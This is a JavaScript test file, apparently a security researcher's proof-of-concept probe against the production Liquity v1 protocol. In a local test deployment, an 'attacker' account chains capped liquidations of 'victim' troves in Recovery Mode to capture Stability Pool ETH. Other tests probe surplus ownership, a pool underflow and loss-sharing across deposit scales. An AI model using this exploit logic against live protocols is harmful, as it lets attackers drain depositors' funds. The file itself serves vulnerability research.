const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")

const th = testHelpers.TestHelper
const dec = th.dec
const toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  ============================================================================
  PoC DEEP PROBE — PRODUCTION Liquity v1 (commit 5174ecd0da4842157aba989499200d690b7e374f)

  Busca vias de EXTRACCION DE VALOR mas_ALLIADAS o distintas del C-1 ya reportado:
    (P1) El atacante puede capturar MAS del ~10%? (encadenar capped liquidations)
    (P2) El surplus de la liquidacion capped -> de quien es y quien lo reclama
    (P3) La rama capped toma MAS coll del que el debt justifica?
    (P4) Se puede agotar el SP entero?
    (P5) Underflow del SP (7fea84a3): alcanzable? revert o valor?
    (P6) Escala de P (82e2a886/288f500d): un depositante captura LUSD de terceros?
  ============================================================================
*/
contract("PoC Deep Probe: Liquity v1 prod 5174ecd", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin, freddy, george, harry] = accounts
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, lusdToken

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address,
      contracts.stabilityPool.address,
      contracts.borrowerOperations.address
    )
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    lusdToken = contracts.lusdToken
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(
      toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  const bal = async (a) => toBN(await web3.eth.getBalance(a))

  // ==========================================================================
  // P1/P3/P4: extraer el maximo con liquidaciones capped encadenadas
  // ==========================================================================
  it("P1: encadenar liquidaciones capped maximiza la extraccion del SP", async () => {
    await priceFeed.setPrice(dec(200, 18))
    await priceFeed.fetchPrice()

    // VICTIMAS: 4 troves con ICR 1.60 @200 (coll = debt/1.6)
    const D = toBN(dec(500000, 18))
    const C = D.mul(toBN(10**18)).div(toBN(dec(16, 18)))
    const victims = []
    for (const v of [alice, bob, carol, erin]) {
      victims.push({ addr: v, ...(await openExact(C, D, v)) })
    }
    // ANCLA: un trove "whale" que fija el TCR real por ENCIMA del ICR de las victimas
    // ICR 2.0 @200 => coll = 2 * debt.  (debt 300k)
    const Danchor = toBN(dec(300000, 18))
    const Canchor = Danchor.mul(toBN(2))
    const anchor = { addr: freddy, ...(await openExact(Canchor, Danchor, freddy)) }
    // SEGUNDO ANCLA, mas pequeno, para mover el TCR
    const Danchor2 = toBN(dec(100000, 18))
    const Canchor2 = Danchor2.mul(toBN(2))
    const anchor2 = { addr: george, ...(await openExact(Canchor2, Danchor2, george)) }

    console.log("victimas: coll", C.toString(), "debt", D.toString())
    console.log("anchor1 : coll", anchor.coll.toString(), "debt", anchor.debt.toString())
    console.log("anchor2 : coll", anchor2.coll.toString(), "debt", anchor2.debt.toString())

    // Crash -> Recovery Mode
    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    const recMode = await th.checkRecoveryMode(contracts)
    console.log("precio", P.toString(), "TCR real", realTCR.toString(), "recoveryMode", recMode.toString())
    for (const v of victims) {
      console.log("  ICR", v.addr.slice(0, 8), (await troveManager.getCurrentICR(v.addr, P)).toString(),
                  ">=TCR?", (await troveManager.getCurrentICR(v.addr, P)).gte(realTCR))
    }
    assert.isTrue(recMode, "must be in Recovery Mode")
    for (const v of victims) {
      assert.isTrue((await troveManager.getCurrentICR(v.addr, P)).gte(realTCR),
        "victim ICR must be >= real TCR")
    }

    // El atacante deposita en el SP
    const dennisLusd = await lusdToken.balanceOf(dennis)
    console.log("dennis LUSD:", dennisLusd.toString())
    const dep = dennisLusd.sub(toBN(dec(1, 18)))
    await stabilityPool.provideToSP(dep, ZERO_ADDRESS, { from: dennis })
    const spDepBefore = await stabilityPool.getTotalLUSDDeposits()
    console.log("SP deposits antes:", spDepBefore.toString())

    const dennisBefore = await bal(dennis)
    const gainBefore = await stabilityPool.getDepositorETHGain(dennis)

    const addrs = victims.map(v => v.addr)
    const tx = await troveManager.batchLiquidateTroves(addrs, { from: owner })
    for (const log of tx.logs) {
      if (log.event === "TroveLiquidated" || log.event === "Liquidation")
        console.log("LOG", log.event, JSON.stringify(log.args))
    }

    console.log("--- AFTER ---")
    for (const v of victims) {
      console.log("  status", v.addr.slice(0, 8), (await troveManager.getTroveStatus(v.addr)).toString(),
                  "surplus", (await collSurplusPool.getCollateral(v.addr)).toString())
    }
    const spEth = toBN(await web3.eth.getBalance(stabilityPool.address))
    const gain = await stabilityPool.getDepositorETHGain(dennis)
    console.log("SP ETH:", spEth.toString())
    console.log("atacante gain:", gain.toString(), "=", gain.div(toBN(dec(1,18))).toString(), "ETH")
    console.log("atacante balance delta:", (await bal(dennis)).sub(dennisBefore).toString())
    console.log("P4: SP deposits restantes:", (await stabilityPool.getTotalLUSDDeposits()).toString(),
                "de", spDepBefore.toString())

    // P3: en la rama capped, collToOffset = debt*MCR/price
    const collToOffset = D.mul(toBN(dec(11, 17))).div(P)
    console.log("P3: collToOffset teorico (debt*1.1/price) =", collToOffset.toString())
    console.log("P3: coll real victima =", C.toString(), " surplus =", C.sub(collToOffset).toString())
  })

  // ==========================================================================
  // P2: el surplus -> de quien es y quien lo reclama
  // ==========================================================================
  it("P2: el surplus de la liquidacion capped es de la victima", async () => {
    await priceFeed.setPrice(dec(200, 18))
    await priceFeed.fetchPrice()
    const D = toBN(dec(500000, 18))
    const C = D.mul(toBN(10**18)).div(toBN(dec(16, 18)))
    const aliceT = await openExact(C, D, alice)
    const Danchor = toBN(dec(300000, 18))
    await openExact(Danchor.mul(toBN(2)), Danchor, freddy)

    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    console.log("TCR real", realTCR.toString(), "recoveryMode", (await th.checkRecoveryMode(contracts)).toString())
    console.log("alice ICR", (await troveManager.getCurrentICR(alice, P)).toString())

    await troveManager.batchLiquidateTroves([alice], { from: owner })
    console.log("alice status", (await troveManager.getTroveStatus(alice)).toString())
    const surplus = await collSurplusPool.getCollateral(alice)
    console.log("alice surplus", surplus.toString())
    const before = await bal(alice)
    await borrowerOperations.claimCollateral({ from: alice })
    console.log("P2: alice reclama su propio surplus ->", (await bal(alice)).sub(before).toString(), "wei")
  })

  // ==========================================================================
  // P5: underflow del SP
  // ==========================================================================
  it("P5: el underflow del SP con offset pequeño", async () => {
    await priceFeed.setPrice(dec(200, 18))
    await priceFeed.fetchPrice()
    const D = toBN(dec(2000, 18))
    const C = D.mul(toBN(10**18)).div(toBN(dec(2, 18)))
    await openExact(C, D, alice)
    // mover LUSD a bob
    const aliceLusd = await lusdToken.balanceOf(alice)
    console.log("alice LUSD", aliceLusd.toString())
    await lusdToken.transfer(bob, aliceLusd, { from: alice })
    await stabilityPool.provideToSP(toBN(dec(2000, 18)), ZERO_ADDRESS, { from: bob })
    console.log("SP deposits:", (await stabilityPool.getTotalLUSDDeposits()).toString())
    console.log("lastLUSDLossError_Offset:", (await stabilityPool.lastLUSDLossError_Offset()).toString())

    await priceFeed.setPrice(dec(100, 18))
    console.log("precio", (await priceFeed.getPrice()).toString(), "TCR", (await th.getTCR(contracts)).toString())
    try {
      await troveManager.batchLiquidateTroves([alice], { from: owner })
      console.log("P5: liquidacion OK. SP deposits:", (await stabilityPool.getTotalLUSDDeposits()).toString())
      console.log("P5: lastLUSDLossError_Offset:", (await stabilityPool.lastLUSDLossError_Offset()).toString())
      console.log("P5: P =", (await stabilityPool.P()).toString(), " scale =", (await stabilityPool.currentScale()).toString())
    } catch (e) {
      console.log("P5: REVERT:", e.message.slice(0, 400))
    }
  })

  // ==========================================================================
  // P6: escala de P — ¿un depositante captura el LUSD de terceros?
  // ==========================================================================
  it("P6: la escala de P y el reparto de perdidas del SP", async () => {
    await priceFeed.setPrice(dec(200, 18))
    await priceFeed.fetchPrice()
    const D = toBN(dec(500000, 18))
    const C = D.mul(toBN(10**18)).div(toBN(dec(16, 18)))
    await openExact(C, D, alice)
    const aliceLusd = await lusdToken.balanceOf(alice)
    await lusdToken.transfer(bob, toBN(dec(100000, 18)), { from: alice })
    await lusdToken.transfer(carol, toBN(dec(400000, 18)), { from: alice })
    await stabilityPool.provideToSP(toBN(dec(100000, 18)), ZERO_ADDRESS, { from: bob })
    await stabilityPool.provideToSP(toBN(dec(400000, 18)), ZERO_ADDRESS, { from: carol })
    const totalBefore = await stabilityPool.getTotalLUSDDeposits()
    console.log("SP deposits antes:", totalBefore.toString())

    await priceFeed.setPrice(dec(90, 18))
    console.log("precio", (await priceFeed.getPrice()).toString())
    try {
      await troveManager.batchLiquidateTroves([alice], { from: owner })
    } catch (e) { console.log("P6: liquidacion reverte:", e.message.slice(0,200)) }
    console.log("P tras:", (await stabilityPool.P()).toString())
    console.log("currentScale:", (await stabilityPool.currentScale()).toString())
    console.log("SP deposits despues:", (await stabilityPool.getTotalLUSDDeposits()).toString())
    const bobComp = await stabilityPool.getCompoundedLUSDDeposit(bob)
    const carolComp = await stabilityPool.getCompoundedLUSDDeposit(carol)
    console.log("bob  compounded:", bobComp.toString(), "de 100000")
    console.log("carol compounded:", carolComp.toString(), "de 400000")
    console.log("suma:", bobComp.add(carolComp).toString(), "vs antes:", totalBefore.toString())
    console.log("SP ETH:", (await web3.eth.getBalance(stabilityPool.address)).toString())
  })
})
